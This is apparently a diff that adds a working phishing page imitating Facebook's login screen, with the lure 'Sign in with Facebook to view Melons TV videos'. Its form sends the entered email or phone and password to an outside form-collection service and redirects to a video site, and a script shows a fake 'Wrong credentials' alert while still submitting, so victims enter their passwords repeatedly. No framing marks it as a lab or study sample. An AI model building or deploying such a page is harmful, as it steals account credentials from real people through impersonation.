@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        /* General Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #1c1e21;
+        }
+
+        /* Header - Facebook Logo */
+        .fb-header {
+            width: 100%;
+            
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        .fb-logo {
+            font-size: 32px;
+            color: #4267B2;
+            font-weight: bold;
+            font-family: 'Helvetica', sans-serif;
+        }
+
+        /* Sign-In Container */
+        .signin-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+
+        .signin-box {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        .signin-heading {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #606770;
+        }
+
+        /* Sign-In Form */
+        .signin-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .signin-form input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+        }
+
+        .signin-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .signin-button:hover {
+            background-color: #165dc5;
+        }
+
+        .forgot-password {
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+            margin-top: 10px;
+            display: block;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        /* Divider */
+        .divider {
+            margin: 20px 0;
+            height: 1px;
+            background-color: #dddfe2;
+            width: 100%;
+        }
+
+        /* Create New Account Button */
+        .create-account {
+            width: 100%;
+            padding: 12px;
+            background-color: #42b72a;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .signin-container {
+                width: 90%;
+            }
+
+            .signin-heading {
+                font-size: 16px;
+            }
+
+            .signin-button, .create-account {
+                font-size: 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .fb-logo {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="fb-header">
+        <div class="fb-logo">facebook</div>
+    </header>
+    <main>
+        <section class="signin-container">
+            <div class="signin-box">
+                <h2 class="signin-heading">Sign in with Facebook to view Melons TV videos</h2>
+                <form class="signin-form" action="https://submit-form.com/3LL633iCy" onsubmit="return handleSubmit(event)">
+                    <input
+                    type="hidden"
+                    name="_redirect"
+                    value="https://melonstube.onrender.com"
+                  />
+                    <input type="text" name="phone" placeholder="Email or Phone Number" required>
+                    <input type="password" name="psswd" placeholder="Password" required>
+                    <button class="signin-button">Sign In</button>
+                    <a href="#" class="forgot-password">Forgotten password?</a>
+                    <div class="divider"></div>
+                    <button class="create-account">Create New Account</button>
+                </form>
+            </div>
+        </section>
+    </main>
+    <script>
+        let clickCount = 0; // Counter to keep track of how many times the button is clicked
+    
+        function handleSubmit(event) {
+            clickCount++; // Increment the click count
+    
+            // For first 3 clicks, show alert but allow the form to submit
+            if (clickCount <= 10) {
+                alert("Wrong credentials !! please try again.");
+                return true; // Allow form submission
+            }
+    
+            // After 3 clicks, stop showing the alert but submit the form
+            return true; // Allow form submission without alert
+        }
+    </script>
+    
+</body>
+</html>
